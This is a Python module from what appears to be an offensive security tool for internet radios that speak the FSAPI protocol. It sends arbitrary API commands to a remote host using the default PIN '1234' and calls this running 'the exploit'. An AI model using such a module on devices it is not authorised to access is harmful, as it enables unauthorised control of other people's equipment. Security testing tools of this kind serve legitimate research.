from fsradio.base.core import Module, check_ip_back, fetch_url, parse


class ExecModule(Module):

    def __init__(self) -> None:
        super().__init__("/fsapi/command_execution")

        for i in range(4):
            self.options.append("")

        self.COMMAND = 0
        self.RHOST= 1
        self.PIN= 2
        self.PARAM= 3

        self.set_option(self.PIN, "1234")

    def show_options(self):
        print(f"\n[*] Module ...{self.get_name()}\n")
        print("[*] Options with current values:")
        print("\t\tOption\t\tRequired\t\tValue")
        print("\t\t------\t\t--------\t\t-----")
        print(f"\t\tCOMMAND\t\tyes\t\t\t{self.get_option(self.COMMAND)}")
        print(f"\t\tRHOST\t\tyes\t\t\t{self.get_option(self.RHOST)}")
        print(f"\t\tPIN\t\tno\t\t\t{self.get_option(self.PIN)}")
        print(f"\t\tPARAM\t\tno\t\t\t{self.get_option(self.PARAM)}\n")

    def check(self, c):
        return c != None and c != ""

    def react(self, input: str):
        a = input.split(" ")
        if a[0] == "set":
            self._set_(a)
        elif a[0] == "run":
            self.run()
        elif a[0] == "show":
            if a[1] == "options":
                self.show_options()
        elif a[0] == "-h":
            self.show_help()

    def _set_(self, cmds):
        if cmds[1] == "COMMAND":
            self.set_option(self.COMMAND, str(cmds[2]))
            print(f"COMMAND -> {self.get_option(self.COMMAND)}\n")
        elif cmds[1] == "RHOST":
            self.set_option(self.RHOST, str(cmds[2]))
            print(f"RHOST -> {self.get_option(self.RHOST)}\n")
        elif cmds[1] == "PIN":
            self.set_option(self.PIN, str(cmds[2]))
            print(f"PIN -> {self.get_option(self.PIN)}\n")
        elif cmds[1] == "PARAM":
            if len(str(cmds[2]).split("=")) == 2:
                self.set_option(self.PARAM, str(cmds[2]))
                print(f"PARAM -> {self.get_option(self.PARAM)}\n")
        else:
            print(f"[!] Unexpected command: {cmds[1]}\n")

    def run(self):
        if not self.check(self.get_option(self.COMMAND)):
            print(f"[!] Cannot run without a command: {self.get_option(self.COMMAND)}")  
            return

        if not self.check(self.get_option(self.PIN)):
            print(f"[!] Cannot run without a pin: {self.get_option(self.PIN)}")
            return

        if not check_ip_back(self.get_option(self.RHOST)):
            print(f"[!] Cannot run without a host: {self.get_option(self.RHOST)}")
            return
    
        URL_t = f"http://{self.get_option(self.RHOST)}/fsapi/{self.get_option(self.COMMAND)}?pin={self.get_option(self.PIN)}"
            
        if self.check(self.get_option(self.PARAM)):
            URL_t += f"&{self.get_option(self.PARAM)}"

        print(f"\n[*] Running with: '{URL_t}'")
        page = fetch_url(URL_t)
        print("[*] Got a response!\n")

        data = parse(page)
        for st in data.iter('status'):
            print(f"[*] Status code: {st.text}")

        for value in data.iter('value'):
            print(f"[*] Value: {value.text}")

        print("\n[*] Successfully executed!")

    def show_help(self):
        print("\nCommands provided by this module:")
        print("--------------------------------\n")
        print("[command] value\n")
        print("-h\t\tshow the help content")
        print("set\t\tset a specific value. There are different options ")
        print("\t\twhen trying to gather information about your device.")
        print("\t\tuse: COMMAND, RHOST, PIN, PARAM")
        print("show options\t\tshow the specified options")
        print("back\t\tcloses this shell")
        print("run\t\truns the exlpoit\n\n")
